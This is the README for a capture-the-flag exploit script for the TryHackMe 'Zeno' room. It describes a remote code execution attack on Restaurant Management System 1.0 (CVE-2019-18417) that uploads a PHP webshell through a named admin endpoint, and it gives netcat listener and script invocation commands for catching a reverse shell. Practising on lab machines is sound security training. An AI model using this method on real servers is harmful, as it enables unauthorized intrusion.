## About:
* **Platform**&nbsp;&nbsp;&nbsp;: TryHackMe
* **Challenge**&nbsp;: Zeno
* **Difficulty**&nbsp;&nbsp;: Medium
* **Link**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: [https://tryhackme.com/room/zeno](https://tryhackme.com/room/zeno)

## Description:
This script exploits a **Remote Code Execution** vulnerability in **Restaurant Management System 1.0**, by running a reverse shell script on the target server in order to get an initial foothold on the system as the user running the vulnerable web application. <br/>
This works by uploading a PHP webshell via the endpoint `/rms/admin/foods-exec.php`. Subsequently, this uploaded webshell located at `/rms/images/` is utilized to execute OS commands on the server.

## Reference:
[+] [https://nvd.nist.gov/vuln/detail/CVE-2019-18417](https://nvd.nist.gov/vuln/detail/CVE-2019-18417)

## Usage:
```bash
# Start a netcat listener on port 'netcat_port':
$ nc -nlvp $netcat_port
# Run the script: 
$ python3 rms-rce.py target_IP target_port target_uri local_ip netcat_port
```

## Example:
```bash
$ nc -nlvp 9999
$ python3 rms-rce.py zeno.thm 12340 /rms/ 10.8.16.233 9999
```
![2023-09-14 20_34_07-KaliLinux - VMware Workstation 17 Player (Non-commercial use only)](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/assets/101610095/84abeea1-f493-4d12-942c-d3f47cde6b7f)
